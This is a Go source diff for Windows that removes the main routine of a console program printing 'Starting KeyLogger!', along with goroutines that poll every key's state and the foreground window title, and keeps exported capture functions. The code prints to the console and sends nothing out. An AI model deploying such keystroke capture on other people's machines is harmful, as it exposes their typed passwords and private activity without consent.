@@ -2,9 +2,7 @@ package main
 
 import (
 	"fmt"
-	"os"
 	"syscall"
-	"time"
 	"unsafe"
 
 	"github.com/TheTitanrain/w32"
@@ -20,7 +18,6 @@ var (
 	tmpTitle  string
 )
 
-// Get Active Window Title
 func getForegroundWindow() (hwnd syscall.Handle, err error) {
 	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
 	if e1 != 0 {
@@ -44,7 +41,7 @@ func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32,
 	return
 }
 
-func getActiveWindowTitle() string {
+func GetActiveWindowTitle() string {
   g, _ := getForegroundWindow()
   b := make([]uint16, 200)
   _, err := getWindowText(g, &b[0], int32(len(b)))
@@ -53,23 +50,6 @@ func getActiveWindowTitle() string {
     return "error"
   }
   return syscall.UTF16ToString(b)
-}
-
-func windowLogger(window chan string) {
-	for {
-		g, _ := getForegroundWindow()
-		b := make([]uint16, 200)
-		_, err := getWindowText(g, &b[0], int32(len(b)))
-		if err != nil {
-		}
-		if syscall.UTF16ToString(b) != "" {
-			if tmpTitle != syscall.UTF16ToString(b) {
-				tmpTitle = syscall.UTF16ToString(b)
-				window <- tmpTitle
-			}
-		}
-		time.Sleep(1 * time.Millisecond)
-	}
 }
 
 type KeyCode int
@@ -315,61 +295,4 @@ func GetPressedKeys() []KeyCode {
 		}
 	}
 	return keys
-}
-
-func keyLogger(keys chan KeyCode) {
-	for {
-		time.Sleep(1 * time.Millisecond)
-		for KEY := 0; KEY <= 256; KEY++ {
-			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
-			if Val == 32769 {
-				keys <- toKeycode(KEY)
-			} else if Val == 32768 {
-				keys <- toKeycode(KEY)
-			} else if Val == 1 {
-				keys <- toKeycode(KEY)
-			} else if Val != 0 {
-				fmt.Println("unknown value:", Val, " key:", toKeycode(KEY))
-			}
-		}
-	}
-}
-
-func read(prefix string, windowTitle chan string) {
-	for {
-		val := <-windowTitle
-		fmt.Println(prefix, val)
-	}
-}
-
-func readKeys(prefix string, keys chan KeyCode) {
-	for {
-		val := <-keys
-		fmt.Println(prefix, val)
-	}
-}
-
-func main() {
-	fmt.Println("Starting KeyLogger!")
-	windowTitle := make(chan string)
-	keys := make(chan KeyCode)
-	go windowLogger(windowTitle)
-
-	go func() {
-		for {
-      window := getActiveWindowTitle()
-      fmt.Println("window:", window)
-
-			keys := GetPressedKeys() 
-			for _, key := range keys {
-				fmt.Println("key:", key)
-			}
-			time.Sleep(1 * time.Millisecond)
-		}
-	}()
-
-	go read("window:", windowTitle)
-	go readKeys("key:", keys)
-	fmt.Println("Press Enter to Exit.")
-	os.Stdin.Read([]byte{0})
 }
